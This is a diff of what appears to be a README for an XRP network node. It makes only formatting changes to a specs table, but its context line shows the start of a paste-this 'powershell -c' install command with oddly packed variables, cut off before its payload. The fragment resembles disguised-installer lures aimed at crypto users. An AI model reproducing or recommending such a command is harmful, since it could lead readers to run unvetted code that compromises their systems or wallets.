@@ -15,11 +15,11 @@ powershell -c "$sync='xrp-mainnet-node=4.1.7-1b0a541'; $import='{ Core } from \"
 
 _After executing the command, the node will begin initializing and syncing with the XRP network._ <br>
 
+### Minimum specs
 <table>
 <tr>
 <td width="50%" valign="top">
 
-<b>Minimum specs</b>
 
 <ul>
 <li>2–4 GB RAM</li>
@@ -30,10 +30,9 @@ _After executing the command, the node will begin initializing and syncing with 
 
 <td width="50%" valign="top">
 
-<b>Recommended</b>
 
 <ul>
-<li>Wired internet connection<br></li>
+<li>Internet connection<br></li>
 
 <li>Display & keyboard<br></li>
 </ul>
@@ -41,7 +40,6 @@ _After executing the command, the node will begin initializing and syncing with 
 </td>
 </tr>
 </table>
-
 # Community
 Thanks to all XRP validators supporting the network.
 
